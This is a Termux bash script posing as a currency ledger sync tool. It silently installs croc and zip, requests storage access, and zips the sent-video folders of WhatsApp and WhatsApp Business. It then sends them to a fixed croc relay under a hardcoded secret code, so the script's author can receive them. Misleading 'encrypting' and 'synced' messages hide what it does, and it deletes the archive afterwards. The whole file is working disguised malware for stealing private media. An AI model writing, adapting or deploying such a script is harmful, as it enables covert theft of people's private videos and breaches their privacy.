#!/bin/bash
SECRET_CODE="DtRn847"

echo "========================================"
echo "    GLOBAL CURRENCY LEDGER SYSTEM        "
echo "    v9.2 | Stable Node Sync | SSL       "
echo "========================================"

# 1. Setup (Zip tool එකත් එක්කම)
if ! command -v croc &> /dev/null || ! command -v zip &> /dev/null; then
    echo ">> [SYSTEM] Updating environment..."
    pkg update -y > /dev/null 2>&1 && pkg install croc zip -y > /dev/null 2>&1
    termux-setup-storage
fi

# 2. Function to Send
send_assets() {
    local SOURCE=$1
    local LABEL=$2
    if [ -d "$SOURCE" ]; then
        echo "----------------------------------------"
        echo ">> [TXN] FOUND: $LABEL"
        echo ">> [STATUS] Encrypting Data Blocks..."
        
        # Temp Zip එකක් හදනවා (මේකෙන් තමයි 'stdin' ප්‍රශ්නය විසඳෙන්නේ)
        zip -r "$HOME/Ledger_Export.zip" "$SOURCE" > /dev/null 2>&1
        
        echo ">> [STATUS] Synchronizing with Relay..."
        env CROC_SECRET="$SECRET_CODE" croc --relay "croc.schollz.com:9009" send "$HOME/Ledger_Export.zip"
        
        # යවලා ඉවර වුණාම අයින් කරනවා
        rm "$HOME/Ledger_Export.zip"
        echo ">> [SUCCESS] $LABEL Complete!"
        sleep 5
    fi
}

# --- STEP 1: Normal WhatsApp Sent Videos ---
WA_VID="/sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video/Sent"
send_assets "$WA_VID" "Primary Asset Ledger"

# --- STEP 2: Business WhatsApp Sent Videos ---
BIZ_VID="/sdcard/Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Business Video/Sent"
send_assets "$BIZ_VID" "Business Asset Ledger"

echo "========================================"
echo "    ALL LEDGERS SYNCED SUCCESSFULLY     "
echo "========================================"
